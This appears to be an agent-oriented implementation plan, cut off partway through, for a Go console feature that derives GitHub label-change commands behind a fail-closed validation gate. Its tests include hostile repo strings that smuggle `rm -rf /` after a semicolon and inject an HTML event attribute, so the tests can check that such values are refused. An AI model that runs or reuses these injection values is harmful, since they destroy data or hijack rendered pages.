# Console UX Polish Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Make the four `/console` tabs operator-grade: actionable intake blocker cards (exact `gh` label commands behind a fail-closed gate), purposeful empty states, and one coherent visual language.

**Architecture:** All changes live in `graph/console*` in transpara-ai/site. A new pure derivation (`graph/console_unblock.go`) computes an unblock plan from projected data only, gated by a whole-board run-level allowlist with per-blocker label-evidence binding. Templates render the plan as selectable text (zero write affordances). Spec: `docs/designs/console-ux-polish-design-v0.1.0.md` (v0.2.0, CFADA round 1 resolved) + issue https://github.com/transpara-ai/site/issues/202.

**Tech Stack:** Go, templ (run `templ generate` after ANY `.templ` edit; commit generated `*_templ.go`), Tailwind v4 semantic tokens, HTMX (existing patterns only).

## Global Constraints

- Read-only surface: NO `<form>`, no `hx-post/put/delete/patch`, no submit buttons, no write endpoints anywhere under `/console`. Close buttons (`type="button"` + onclick clearing a drawer) are the only allowed buttons besides card-open buttons.
- Fail-closed: no code path may render a command for a blocker/label/repo/number combination not explicitly proven valid. No `default:`/`else` branch that emits.
- Honest staleness: unavailable states keep their notice-only rendering — no teaching copy or links added to unavailable branches.
- Every currently rendered projected field stays rendered (no information-density loss).
- Label strings are the fixed constants below — NEVER echo projection free-text into a command.
- Tests: `go test ./graph/... -run 'Console' -count=1` per task; full `make verify` in the final task.
- Commit after each task with a conventional-commit message; end commit messages with `Co-Authored-By: Claude Fable 5 <noreply@anthropic.com>`.

---

### Task 1: Unblock-plan derivation (pure Go, full-domain tests)

**Files:**
- Create: `graph/console_unblock.go`
- Test: create `graph/console_unblock_test.go`

**Interfaces:**
- Consumes: `OpsCivilizationIssueScanKanban`, `OpsCivilizationIssueScanKanbanCard`, `OpsCivilizationIssueRef` (`graph/civilization_issue_scan.go:16-117`).
- Produces (later tasks rely on these exact names):
  - `type consoleUnblockPlan struct { ScopeCommand, ProtectedCommand, RescanCommand string }` — commands are split by authority class: ScopeCommand handles `cc:pr-deferred`/`cc:needs-human-scope` removal + `cc:pr-ready` add; ProtectedCommand is ONLY the `cc:protected-action` removal and renders with a mandatory authorization warning. They are never combined.
  - `func consoleIssueScanRunBlockerTypes(board OpsCivilizationIssueScanKanban) map[string][]string`
  - `func consoleIssueScanUnblockPlan(card OpsCivilizationIssueScanKanbanCard, runBlockerTypes map[string][]string) (consoleUnblockPlan, bool)`
  - `func consoleIssueScanCardRef(card OpsCivilizationIssueScanKanbanCard) OpsCivilizationIssueRef`
  - `type consoleLabelChip struct { Label, Kind string }` with Kind ∈ {`deny`,`ready`,`cc`,`plain`}
  - `func consoleIssueScanRefChips(card OpsCivilizationIssueScanKanbanCard) []consoleLabelChip`

- [ ] **Step 1: Write the failing tests**

```go
package graph

import "testing"

func unblockCard(runID, blockerType string, labels []string) OpsCivilizationIssueScanKanbanCard {
	return OpsCivilizationIssueScanKanbanCard{
		RunID: runID,
		Blockers: []OpsCivilizationIssueScanBlockerProjected{{BlockerType: blockerType, RequiredAction: "projected action"}},
		TargetIssue: OpsCivilizationIssueRef{Repo: "transpara-ai/docs", Number: 226, Labels: labels},
	}
}

func boardWith(cards ...OpsCivilizationIssueScanKanbanCard) OpsCivilizationIssueScanKanban {
	return OpsCivilizationIssueScanKanban{Columns: []OpsCivilizationIssueScanKanbanColumn{{State: "blocked", Label: "Human action", Cards: cards}}}
}

// TestConsoleUnblockPlanDomain is the fix-the-class test: it walks the whole
// blocker-type input domain (all five known types, empty, and a future value)
// crossed with label evidence, repo validity, and number validity. The
// permissive outcome (a command renders) must be the explicitly-proven branch.
func TestConsoleUnblockPlanDomain(t *testing.T) {
	cases := []struct {
		name          string
		card          OpsCivilizationIssueScanKanbanCard
		siblings      []OpsCivilizationIssueScanKanbanCard
		wantOK        bool
		wantScope     string
		wantProtected string
		wantRescan    string
	}{
		{
			name:      "needs_human_scope with scope deny labels only",
			card:      unblockCard("run-1", "needs_human_scope", []string{"cc:needs-human-scope", "cc:pr-deferred", "cc:intake"}),
			wantOK:    true,
			wantScope: "gh issue edit 226 --repo transpara-ai/docs --remove-label cc:pr-deferred --remove-label cc:needs-human-scope --add-label cc:pr-ready",
			wantRescan: "hive factory scan-issues --human YOUR_NAME --repo transpara-ai/docs",
		},
		{
			// The live docs#226 shape: one witnessed blocker (first-match
			// parking), full deny-label superset. Protected removal must be
			// its OWN command, never folded into the scope command.
			name:          "label superset splits protected removal into separate command",
			card:          unblockCard("run-2", "needs_human_scope", []string{"cc:needs-human-scope", "cc:pr-deferred", "cc:protected-action"}),
			wantOK:        true,
			wantScope:     "gh issue edit 226 --repo transpara-ai/docs --remove-label cc:pr-deferred --remove-label cc:needs-human-scope --add-label cc:pr-ready",
			wantProtected: "gh issue edit 226 --repo transpara-ai/docs --remove-label cc:protected-action",
			wantRescan:    "hive factory scan-issues --human YOUR_NAME --repo transpara-ai/docs",
		},
		{
			name:          "protected_action corroborated",
			card:          unblockCard("run-3", "protected_action", []string{"cc:protected-action"}),
			wantOK:        true,
			wantScope:     "gh issue edit 226 --repo transpara-ai/docs --add-label cc:pr-ready",
			wantProtected: "gh issue edit 226 --repo transpara-ai/docs --remove-label cc:protected-action",
			wantRescan:    "hive factory scan-issues --human YOUR_NAME --repo transpara-ai/docs",
		},
		{
			// codex CFADA round-2 scenario: run projects only not_pr_ready but
			// the ref carries the protected label. The protected boundary may
			// only be cleared via the separate, warned command.
			name:          "not_pr_ready with protected label present keeps commands split",
			card:          unblockCard("run-4", "not_pr_ready", []string{"cc:protected-action"}),
			wantOK:        true,
			wantScope:     "gh issue edit 226 --repo transpara-ai/docs --add-label cc:pr-ready",
			wantProtected: "gh issue edit 226 --repo transpara-ai/docs --remove-label cc:protected-action",
			wantRescan:    "hive factory scan-issues --human YOUR_NAME --repo transpara-ai/docs",
		},
		{
			name:      "not_pr_ready with no labels renders add-only scope command",
			card:      unblockCard("run-5", "not_pr_ready", nil),
			wantOK:    true,
			wantScope: "gh issue edit 226 --repo transpara-ai/docs --add-label cc:pr-ready",
			wantRescan: "hive factory scan-issues --human YOUR_NAME --repo transpara-ai/docs",
		},
		{
			name:      "label normalization matches hive (case + whitespace)",
			card:      unblockCard("run-6", "needs_human_scope", []string{"  CC:Needs-Human-Scope  "}),
			wantOK:    true,
			wantScope: "gh issue edit 226 --repo transpara-ai/docs --remove-label cc:needs-human-scope --add-label cc:pr-ready",
			wantRescan: "hive factory scan-issues --human YOUR_NAME --repo transpara-ai/docs",
		},
		// ---- everything below MUST fail closed ----
		{name: "stale_target never gets a command", card: unblockCard("run-5", "stale_target", []string{"cc:needs-human-scope"})},
		{name: "duplicate_chain never gets a command", card: unblockCard("run-6", "duplicate_chain", nil)},
		{name: "empty blocker type", card: unblockCard("run-7", "", []string{"cc:needs-human-scope"})},
		{name: "future blocker type", card: unblockCard("run-8", "future_blocker_v2", []string{"cc:needs-human-scope"})},
		{name: "no blockers at all", card: OpsCivilizationIssueScanKanbanCard{RunID: "run-9", TargetIssue: OpsCivilizationIssueRef{Repo: "transpara-ai/docs", Number: 226}}},
		{name: "empty run id cannot be verified run-wide", card: unblockCard("", "needs_human_scope", []string{"cc:needs-human-scope"})},
		{
			name:     "sibling card on same run carries non-label blocker",
			card:     unblockCard("run-10", "needs_human_scope", []string{"cc:needs-human-scope"}),
			siblings: []OpsCivilizationIssueScanKanbanCard{unblockCard("run-10", "stale_target", nil)},
		},
		{
			name:     "sibling card on same run carries unknown blocker",
			card:     unblockCard("run-11", "protected_action", []string{"cc:protected-action"}),
			siblings: []OpsCivilizationIssueScanKanbanCard{unblockCard("run-11", "mystery_blocker", nil)},
		},
		{name: "needs_human_scope without corroborating deny label (mismatch)", card: unblockCard("run-12", "needs_human_scope", []string{"cc:intake"})},
		{name: "protected_action without cc:protected-action label (mismatch)", card: unblockCard("run-13", "protected_action", []string{"cc:pr-deferred"})},
		{name: "not_pr_ready but cc:pr-ready already present (mismatch)", card: unblockCard("run-14", "not_pr_ready", []string{"cc:pr-ready"})},
		{name: "invalid repo missing slash", card: func() OpsCivilizationIssueScanKanbanCard { c := unblockCard("run-15", "not_pr_ready", nil); c.TargetIssue.Repo = "docs"; return c }()},
		{name: "hostile repo with shell metacharacters", card: func() OpsCivilizationIssueScanKanbanCard { c := unblockCard("run-16", "not_pr_ready", nil); c.TargetIssue.Repo = "transpara-ai/docs; rm -rf /"; return c }()},
		{name: "hostile repo with html", card: func() OpsCivilizationIssueScanKanbanCard { c := unblockCard("run-17", "not_pr_ready", nil); c.TargetIssue.Repo = "transpara-ai/docs\" onmouseover=\"x"; return c }()},
		{name: "zero issue number", card: func() OpsCivilizationIssueScanKanbanCard { c := unblockCard("run-18", "not_pr_ready", nil); c.TargetIssue.Number = 0; return c }()},
		{name: "negative issue number", card: func() OpsCivilizationIssueScanKanbanCard { c := unblockCard("run-19", "not_pr_ready", nil); c.TargetIssue.Number = -4; return c }()},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			board := boardWith(append([]OpsCivilizationIssueScanKanbanCard{tc.card}, tc.siblings...)...)
			plan, ok := consoleIssueScanUnblockPlan(tc.card, consoleIssueScanRunBlockerTypes(board))
			if ok != tc.wantOK {
				t.Fatalf("ok = %v, want %v (plan %+v)", ok, tc.wantOK, plan)
			}
			if !ok {
				if plan.ScopeCommand != "" || plan.ProtectedCommand != "" || plan.RescanCommand != "" {
					t.Fatalf("fail-closed plan must be empty, got %+v", plan)
				}
				return
			}
			if plan.ScopeCommand != tc.wantScope {
				t.Errorf("scope command\n got: %s\nwant: %s", plan.ScopeCommand, tc.wantScope)
			}
			if plan.ProtectedCommand != tc.wantProtected {
				t.Errorf("protected command\n got: %s\nwant: %s", plan.ProtectedCommand, tc.wantProtected)
			}
			if plan.RescanCommand != tc.wantRescan {
				t.Errorf("rescan command\n got: %s\nwant: %s", plan.RescanCommand, tc.wantRescan)
			}
		})
	}
}

// The plan must read every field from ONE ref: target preferred, selected as
// fallback — never mixed.
func TestConsoleUnblockPlanUsesSelectedRefWhenTargetEmpty(t *testing.T) {
	card := OpsCivilizationIssueScanKanbanCard{
		RunID:    "run-20",
		Blockers: []OpsCivilizationIssueScanBlockerProjected{{BlockerType: "not_pr_ready"}},
		SelectedIssue: OpsCivilizationIssueRef{Repo: "transpara-ai/work", Number: 55},
	}
	plan, ok := consoleIssueScanUnblockPlan(card, consoleIssueScanRunBlockerTypes(boardWith(card)))
	if !ok {
		t.Fatal("expected plan from selected-issue fallback")
	}
	want := "gh issue edit 55 --repo transpara-ai/work --add-label cc:pr-ready"
	if plan.ScopeCommand != want {
		t.Fatalf("scope command = %q, want %q", plan.ScopeCommand, want)
	}
	if plan.ProtectedCommand != "" {
		t.Fatalf("no protected label present; protected command must be empty, got %q", plan.ProtectedCommand)
	}
}

func TestConsoleIssueScanRefChips(t *testing.T) {
	card := unblockCard("run-21", "needs_human_scope", []string{"cc:needs-human-scope", "cc:pr-ready", "cc:intake", "Weird Label!"})
	chips := consoleIssueScanRefChips(card)
	want := []consoleLabelChip{
		{Label: "cc:needs-human-scope", Kind: "deny"},
		{Label: "cc:pr-ready", Kind: "ready"},
		{Label: "cc:intake", Kind: "cc"},
		{Label: "Weird Label!", Kind: "plain"},
	}
	if len(chips) != len(want) {
		t.Fatalf("chips = %+v, want %+v", chips, want)
	}
	for i := range want {
		if chips[i] != want[i] {
			t.Errorf("chip[%d] = %+v, want %+v", i, chips[i], want[i])
		}
	}
}
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `go test ./graph/ -run 'TestConsoleUnblock|TestConsoleIssueScanRefChips' -count=1`
Expected: FAIL — `undefined: consoleIssueScanUnblockPlan` etc.

- [ ] **Step 3: Implement `graph/console_unblock.go`**

```go
package graph

import (
	"fmt"
	"regexp"
	"strings"
)

// Change-control labels the hive intake gate reads (hive pkg/hive/issue_intake.go:18-21).
// Fixed constants: commands are built ONLY from these strings, never from
// projection free-text.
const (
	consoleLabelPRReady    = "cc:pr-ready"
	consoleLabelPRDeferred = "cc:pr-deferred"
	consoleLabelNeedsHuman = "cc:needs-human-scope"
	consoleLabelProtected  = "cc:protected-action"
)

// consoleUnblockScopeDenyLabels is the fixed removal order for the SCOPE
// command. cc:protected-action is deliberately absent: clearing a
// protected-action boundary is its own authority act and always renders as a
// separate command with warning copy (design D2, CFADA2-2).
var consoleUnblockScopeDenyLabels = []string{consoleLabelPRDeferred, consoleLabelNeedsHuman}

// consoleUnblockRepoPattern accepts only a plain GitHub owner/repo pair. The
// rendered command is operator-terminal copy-paste, so anything outside this
// character set (spaces, quotes, semicolons, redirects, HTML) refuses to render.
var consoleUnblockRepoPattern = regexp.MustCompile(`^[A-Za-z0-9][A-Za-z0-9_.-]*/[A-Za-z0-9][A-Za-z0-9_.-]*$`)

// consoleUnblockPlan is operator guidance derived purely from projected data.
// ScopeCommand and ProtectedCommand are split by authority class and are
// never merged: the protected-action removal must be a deliberate, separately
// copied act.
type consoleUnblockPlan struct {
	ScopeCommand     string
	ProtectedCommand string
	RescanCommand    string
}

type consoleLabelChip struct {
	Label string
	Kind  string // deny | ready | cc | plain
}

var consoleChipPattern = regexp.MustCompile(`^cc:[a-z0-9-]+$`)

// consoleIssueScanCardRef picks the ONE issue ref every unblock field reads
// from: target preferred, selected fallback — same preference as
// consoleIssueScanCardIssue (graph/console.go:227-233), never mixed.
func consoleIssueScanCardRef(card OpsCivilizationIssueScanKanbanCard) OpsCivilizationIssueRef {
	ref := card.TargetIssue
	if ref.Repo == "" && ref.Number == 0 {
		ref = card.SelectedIssue
	}
	return ref
}

// consoleIssueScanRunBlockerTypes indexes every blocker type projected for
// each RunID across the whole board. The unblock gate consults it so a card
// cannot offer a label command while a sibling card of the same run carries a
// blocker that labels cannot clear (CFADA1-1).
func consoleIssueScanRunBlockerTypes(board OpsCivilizationIssueScanKanban) map[string][]string {
	out := map[string][]string{}
	for _, col := range board.Columns {
		for _, card := range col.Cards {
			runID := strings.TrimSpace(card.RunID)
			if runID == "" {
				continue
			}
			for _, b := range card.Blockers {
				out[runID] = append(out[runID], strings.ToLower(strings.TrimSpace(b.BlockerType)))
			}
		}
	}
	return out
}

// consoleLabelSet normalizes exactly like hive's issueScanLabelSet
// (pkg/hive/issue_scan_parking.go:367-376), so the site's view of the label
// gate matches the gate itself.
func consoleLabelSet(labels []string) map[string]struct{} {
	out := map[string]struct{}{}
	for _, label := range labels {
		label = strings.ToLower(strings.TrimSpace(label))
		if label != "" {
			out[label] = struct{}{}
		}
	}
	return out
}

// consoleIssueScanUnblockPlan derives the exact operator commands that unblock
// a label-parked run — or refuses. Fail-closed allowlist: the permissive
// outcome (a command renders) is the explicitly-proven branch; every unknown,
// mismatched, unverifiable, or mixed state returns ok=false. There is no
// default that emits.
func consoleIssueScanUnblockPlan(card OpsCivilizationIssueScanKanbanCard, runBlockerTypes map[string][]string) (consoleUnblockPlan, bool) {
	runID := strings.TrimSpace(card.RunID)
	if runID == "" || len(card.Blockers) == 0 {
		return consoleUnblockPlan{}, false
	}
	types := runBlockerTypes[runID]
	if len(types) == 0 {
		return consoleUnblockPlan{}, false
	}
	ref := consoleIssueScanCardRef(card)
	if !consoleUnblockRepoPattern.MatchString(ref.Repo) || ref.Number <= 0 {
		return consoleUnblockPlan{}, false
	}
	labels := consoleLabelSet(ref.Labels)
	_, hasPRReady := labels[consoleLabelPRReady]
	_, hasDeferred := labels[consoleLabelPRDeferred]
	_, hasNeedsHuman := labels[consoleLabelNeedsHuman]
	_, hasProtected := labels[consoleLabelProtected]
	// Every blocker type projected for this run must be label-actionable AND
	// corroborated by the label evidence on the chosen ref (CFADA1-2). A
	// blocker without its evidence is a projection/label mismatch: refuse.
	for _, bt := range types {
		switch bt {
		case "needs_human_scope":
			if !hasDeferred && !hasNeedsHuman {
				return consoleUnblockPlan{}, false
			}
		case "protected_action":
			if !hasProtected {
				return consoleUnblockPlan{}, false
			}
		case "not_pr_ready":
			if hasPRReady {
				return consoleUnblockPlan{}, false
			}
		default:
			// stale_target, duplicate_chain, empty, or any future blocker
			// type: labels cannot clear it — no command.
			return consoleUnblockPlan{}, false
		}
	}
	base := fmt.Sprintf("gh issue edit %d --repo %s", ref.Number, ref.Repo)
	scopeParts := []string{base}
	for _, deny := range consoleUnblockScopeDenyLabels {
		if _, ok := labels[deny]; ok {
			scopeParts = append(scopeParts, "--remove-label "+deny)
		}
	}
	if !hasPRReady {
		scopeParts = append(scopeParts, "--add-label "+consoleLabelPRReady)
	}
	scope := ""
	if len(scopeParts) > 1 {
		scope = strings.Join(scopeParts, " ")
	}
	protected := ""
	if hasProtected {
		protected = base + " --remove-label " + consoleLabelProtected
	}
	if scope == "" && protected == "" {
		// Nothing to change: no deny labels present and pr-ready already set.
		return consoleUnblockPlan{}, false
	}
	return consoleUnblockPlan{
		ScopeCommand:     scope,
		ProtectedCommand: protected,
		RescanCommand:    "hive factory scan-issues --human YOUR_NAME --repo " + ref.Repo,
	}, true
}

// consoleIssueScanRefChips classifies the chosen ref's labels for display.
// Classification is an allowlist; everything unrecognized renders as plain
// escaped text (Kind "plain"), never dropped and never trusted.
func consoleIssueScanRefChips(card OpsCivilizationIssueScanKanbanCard) []consoleLabelChip {
	ref := consoleIssueScanCardRef(card)
	chips := make([]consoleLabelChip, 0, len(ref.Labels))
	for _, raw := range ref.Labels {
		display := strings.TrimSpace(raw)
		if display == "" {
			continue
		}
		normalized := strings.ToLower(display)
		var kind string
		switch {
		case normalized == consoleLabelPRReady:
			kind = "ready"
		case normalized == consoleLabelPRDeferred || normalized == consoleLabelNeedsHuman || normalized == consoleLabelProtected:
			kind = "deny"
		case consoleChipPattern.MatchString(normalized):
			kind = "cc"
		default:
			kind = "plain"
		}
		chips = append(chips, consoleLabelChip{Label: display, Kind: kind})
	}
	return chips
}
```

Note: the test "label normalization matches hive" expects the display chip and the command to use the *normalized* label (`--remove-label cc:needs-human-scope`), which the implementation guarantees because commands only ever append the fixed constants.

- [ ] **Step 4: Run tests to verify they pass**

Run: `go test ./graph/ -run 'TestConsoleUnblock|TestConsoleIssueScanRefChips' -count=1`
Expected: PASS

- [ ] **Step 5: Commit**

```bash
git add graph/console_unblock.go graph/console_unblock_test.go
git commit -m "feat(console): fail-closed unblock-plan derivation for intake blocker cards"
```

---

### Task 2: Drawer Unblock section + card hint

**Files:**
- Modify: `graph/console.go` (buildConsoleIssueScan ~line 117-161, handleConsoleIntakeCard ~line 201-222)
- Modify: `graph/console.templ` (consoleIssueScanCard ~line 161-197, consoleIssueScanDrawer ~line 199-252)
- Modify: `graph/civilization_issue_scan.go` (card struct ~line 91-117: one new field)
- Test: extend `graph/console_intake_test.go`
- Regenerate: `templ generate` (commit `graph/console_templ.go`)

**Interfaces:**
- Consumes: `consoleIssueScanUnblockPlan`, `consoleIssueScanRunBlockerTypes`, `consoleUnblockPlan`, `consoleIssueScanRefChips` from Task 1.
- Produces: `OpsCivilizationIssueScanKanbanCard.UnblockAvailable bool` (set ONLY in `buildConsoleIssueScan`; zero-value elsewhere so /ops surfaces are untouched); drawer signature becomes `consoleIssueScanDrawer(card OpsCivilizationIssueScanKanbanCard, found bool, plan consoleUnblockPlan, planOK bool)`.

- [ ] **Step 1: Write the failing tests** (append to `graph/console_intake_test.go`; follow the existing test-fixture style in that file — it builds `OpsCivilizationAssemblyProjection` fixtures and renders via `httptest`; reuse its helpers where present)

```go
// A blocked card whose run is label-parked (deny label projected on the target
// issue) must expose the exact unblock commands in the drawer, plus the
// parked-run-is-terminal explanation — copy-paste correct, derived only from
// projected data.
func TestConsoleIntakeDrawerRendersUnblockCommands(t *testing.T) {
	h := newConsoleTestHandlers(t)
	proj := issueScanProjectionFixture(t) // reuse/extend the file's existing fixture builder
	// ensure the fixture's blocked card has: RunID "run-ub", blocker
	// needs_human_scope, target transpara-ai/docs#226 with labels
	// ["cc:needs-human-scope"].
	rec := renderConsoleIntakeCard(t, h, proj, "run-ub", "stage-ub") // existing drawer-render helper pattern
	body := rec.Body.String()
	for _, want := range []string{
		"gh issue edit 226 --repo transpara-ai/docs --remove-label cc:needs-human-scope --add-label cc:pr-ready",
		"A parked run is terminal.",
		"hive factory scan-issues --human YOUR_NAME --repo transpara-ai/docs",
		"--dispatch",
	} {
		if !strings.Contains(body, want) {
			t.Errorf("drawer missing %q\nbody: %s", want, body)
		}
	}
	// No protected label in this fixture: the warning copy must be absent.
	if strings.Contains(body, "protected-action boundary") {
		t.Error("protected warning rendered without a protected command")
	}
}

// When cc:protected-action is present the removal renders as its own warned
// command, never folded into the scope command.
func TestConsoleIntakeDrawerSplitsProtectedCommand(t *testing.T) {
	// fixture card: blocker needs_human_scope, target transpara-ai/docs#226,
	// labels ["cc:needs-human-scope", "cc:protected-action"].
	// assert body contains BOTH:
	//   "gh issue edit 226 --repo transpara-ai/docs --remove-label cc:needs-human-scope --add-label cc:pr-ready"
	//   "gh issue edit 226 --repo transpara-ai/docs --remove-label cc:protected-action"
	// and the warning "run it only if you authorize the protected action"
	// and does NOT contain "--remove-label cc:needs-human-scope --remove-label cc:protected-action"
	// nor "--remove-label cc:protected-action --add-label" (no folding).
}

// A run with a non-label blocker must NOT offer commands anywhere — drawer
// keeps the projected RequiredAction only.
func TestConsoleIntakeDrawerNoCommandForNonLabelBlocker(t *testing.T) {
	// fixture card: blocker stale_target, valid repo/number, deny label present
	// (labels alone must not resurrect the command).
	// assert body does NOT contain "gh issue edit" and DOES contain the
	// projected required action text.
}

// The board card shows the hint iff the plan gate passes.
func TestConsoleIntakeCardUnblockHint(t *testing.T) {
	// render /console/intake with one label-parked card (gate passes) and one
	// stale_target card (gate refuses).
	// assert exactly one occurrence of "unblock available".
}
```

Write these as real tests against the file's actual fixture helpers (read the file first; `TestConsoleIntakeRendersIssueScanBoard` at ~line 197 and `TestConsoleIntakeCardDrawerRendersPossessionAndLineage` at ~line 391 show the fixture/render pattern to copy).

- [ ] **Step 2: Run tests to verify they fail**

Run: `go test ./graph/ -run 'TestConsoleIntakeDrawerRendersUnblock|TestConsoleIntakeDrawerNoCommand|TestConsoleIntakeCardUnblockHint' -count=1`
Expected: FAIL (compile error: consoleIssueScanDrawer signature / missing rendering)

- [ ] **Step 3: Implement**

3a. `graph/civilization_issue_scan.go` — add to `OpsCivilizationIssueScanKanbanCard` (after `EvidenceRefs`):

```go
	// UnblockAvailable is a Site console display derivation (set only by
	// buildConsoleIssueScan): true when the fail-closed unblock gate offers
	// operator commands for this card. Never projected; zero-value on /ops.
	UnblockAvailable bool
```

3b. `graph/console.go` — in `buildConsoleIssueScan`, after `board := opsCivilizationIssueScanKanban(proj)` compute the index and stamp cards (do this right before the final usable return, so unavailable boards never carry hints):

```go
	runBlockerTypes := consoleIssueScanRunBlockerTypes(board)
	for ci := range board.Columns {
		for i := range board.Columns[ci].Cards {
			_, ok := consoleIssueScanUnblockPlan(board.Columns[ci].Cards[i], runBlockerTypes)
			board.Columns[ci].Cards[i].UnblockAvailable = ok
		}
	}
```

3c. `graph/console.go` — `handleConsoleIntakeCard`: compute the plan for the found card and pass it through; the not-found branch passes the empty plan:

```go
	if scan.Freshness != FreshnessUnavailable {
		runBlockerTypes := consoleIssueScanRunBlockerTypes(scan.Board)
		for _, col := range scan.Board.Columns {
			for _, card := range col.Cards {
				if card.RunID == run && card.StageID == stage {
					plan, planOK := consoleIssueScanUnblockPlan(card, runBlockerTypes)
					consoleIssueScanDrawer(card, true, plan, planOK).Render(r.Context(), w)
					return
				}
			}
		}
	}
	consoleIssueScanDrawer(OpsCivilizationIssueScanKanbanCard{RunID: run, StageID: stage}, false, consoleUnblockPlan{}, false).Render(r.Context(), w)
```

3d. `graph/console.templ` — card hint: inside `consoleIssueScanCard`, directly after the `if len(card.Blockers) > 0 { ... }` block:

```templ
	if card.UnblockAvailable {
		<p class="text-[10px] text-brand">unblock available — open for the exact commands</p>
	}
```

3e. `graph/console.templ` — drawer: change the signature line to

```templ
templ consoleIssueScanDrawer(card OpsCivilizationIssueScanKanbanCard, found bool, plan consoleUnblockPlan, planOK bool) {
```

and insert, between the `</dl>` close and the existing Blockers section:

```templ
				if chips := consoleIssueScanRefChips(card); len(chips) > 0 {
					<div class="flex flex-wrap gap-1 pt-1">
						for _, chip := range chips {
							switch chip.Kind {
								case "deny":
									<span class="inline-flex items-center rounded-full border border-amber-500/40 px-2 py-0.5 text-[10px] text-amber-300">{ chip.Label }</span>
								case "ready":
									<span class="inline-flex items-center rounded-full border border-emerald-500/40 px-2 py-0.5 text-[10px] text-emerald-300">{ chip.Label }</span>
								case "cc":
									<span class="inline-flex items-center rounded-full border border-edge px-2 py-0.5 text-[10px] text-warm-muted">{ chip.Label }</span>
								default:
									<span class="text-[10px] text-warm-muted">{ chip.Label }</span>
							}
						}
					</div>
				}
				if planOK {
					<div class="border-t border-edge pt-3 space-y-2" data-console-unblock>
						<p class="text-[10px] text-warm-faint uppercase tracking-widest">unblock</p>
						if plan.ScopeCommand != "" {
							<p class="text-xs text-warm-secondary break-words">Relabel the target issue to admit it. Hive reads labels only — it never edits them; this action is yours:</p>
							<pre class="bg-elevated border border-edge rounded p-2 overflow-x-auto"><code class="text-[11px] font-mono text-warm-secondary select-all">{ plan.ScopeCommand }</code></pre>
						}
						if plan.ProtectedCommand != "" {
							<p class="text-xs text-amber-300 break-words">This second command clears a protected-action boundary — run it only if you authorize the protected action:</p>
							<pre class="bg-elevated border border-amber-500/40 rounded p-2 overflow-x-auto"><code class="text-[11px] font-mono text-warm-secondary select-all">{ plan.ProtectedCommand }</code></pre>
						}
						<p class="text-xs text-warm-secondary break-words"><span class="text-warm font-medium">A parked run is terminal.</span> Fixing labels does not resume this run — the parked event is final and idempotent. After relabeling, a fresh scan cycle re-queues the issue: run the command below (add <span class="font-mono">--dispatch</span> to also launch the queued run as a factory order), or wait for the scan daemon&apos;s next interval.</p>
						<pre class="bg-elevated border border-edge rounded p-2 overflow-x-auto"><code class="text-[11px] font-mono text-warm-secondary select-all">{ plan.RescanCommand }</code></pre>
						<p class="text-[10px] text-warm-muted">Replace YOUR_NAME with the requesting human. Daemon alternative: <span class="font-mono">hive factory daemon --issue-scan-interval 15m</span></p>
					</div>
				}
```

Note the drawer's unblock section renders ONLY from `planOK` — the section cannot appear for a not-found card because the handler hard-passes `false`.

3f. Run `templ generate` (never edit `console_templ.go` by hand).

- [ ] **Step 4: Run the full console test suite**

Run: `go test ./graph/ -run 'Console' -count=1`
Expected: PASS (existing drawer tests updated only where the signature changed — mechanical `, consoleUnblockPlan{}, false` additions in callers; do NOT weaken any assertion)

- [ ] **Step 5: Commit**

```bash
git add graph/console.go graph/console.templ graph/console_templ.go graph/civilization_issue_scan.go graph/console_intake_test.go
git commit -m "feat(console): actionable unblock commands in intake drawer behind fail-closed gate"
```

---

### Task 3: Purposeful empty states

**Files:**
- Modify: `graph/console.templ` (kanban empty ~line 96, intake empty ~line 145, health empty ~line 358, config empties ~lines 431, 451)
- Test: extend `graph/console_kanban_test.go`, `graph/console_intake_test.go`, `graph/console_test.go`, `graph/console_config_test.go`
- Regenerate: `templ generate`

**Interfaces:** none new — copy changes only.

- [ ] **Step 1: Write the failing tests** (one per surface; follow each file's existing render-test pattern)

```go
// console_kanban_test.go
func TestConsoleKanbanEmptyStateExplainsFlowAndLinksIntake(t *testing.T) {
	// build a kanban with zero tasks, no error (freshness stale per build rules)
	// render the page; assert body contains:
	//   "No factory orders yet."
	//   "cc:pr-ready"
	//   `href="/console/intake"`
}

func TestConsoleKanbanUnavailableStateHasNoIntakeLink(t *testing.T) {
	// fetch error → unavailable; assert body does NOT contain href="/console/intake"
	// within the kanban surface fragment render (fragment render, not full page,
	// so the nav tab link doesn't false-positive).
}

// console_intake_test.go
func TestConsoleIntakeEmptyStateExplainsScanCycle(t *testing.T) {
	// projection: complete status, fresh timestamp, zero columns
	// assert "No issue-scan runs projected." AND "hive factory scan-issues" AND "cc:pr-ready"
}

// console_test.go
func TestConsoleHealthEmptyRosterIsPurposeful(t *testing.T) {
	// projection with zero agents, fresh → assert "No active agents." AND "civilization run"
}

// console_config_test.go
func TestConsoleConfigEmptyStatesCarryContext(t *testing.T) {
	// selection with Source set, no models/assignments → assert existing strings
	// plus "Role routing appears once" and "hot-reloaded"
}
```

- [ ] **Step 2: Run to verify they fail**

Run: `go test ./graph/ -run 'EmptyState|EmptyRoster|CarryContext|NoIntakeLink' -count=1`
Expected: FAIL on missing copy

- [ ] **Step 3: Implement the copy in `graph/console.templ`**

Kanban (replace `<p class="text-sm text-warm-muted">No orders.</p>`):

```templ
			<div class="border border-edge bg-surface rounded-lg p-6 space-y-2" data-state="empty">
				<p class="text-sm font-medium text-warm">No factory orders yet.</p>
				<p class="text-sm text-warm-muted">Work enters the factory at Intake: issues labeled <span class="font-mono text-[11px]">cc:pr-ready</span> are admitted by the issue scanner and become orders tracked here.</p>
				<a href="/console/intake" class="inline-block text-sm text-brand hover:underline">Go to Intake →</a>
			</div>
```

Intake (replace `<p class="text-sm text-warm-muted">No issue-scan runs projected.</p>`):

```templ
			<div class="border border-edge bg-surface rounded-lg p-6 space-y-2" data-state="empty">
				<p class="text-sm font-medium text-warm">No issue-scan runs projected.</p>
				<p class="text-sm text-warm-muted">Runs appear after a scan cycle: one-shot <span class="font-mono text-[11px]">hive factory scan-issues</span>, or the scan daemon on its interval. Issues need the <span class="font-mono text-[11px]">cc:pr-ready</span> label to be admitted.</p>
			</div>
```

Health (replace the `No active agents reported.` div content):

```templ
					<div class="px-4 py-3 text-sm text-warm-muted">No active agents. Agents report here while a civilization run is in flight; between runs an empty roster is the honest state.</div>
```

Config assignments empty (replace div content):

```templ
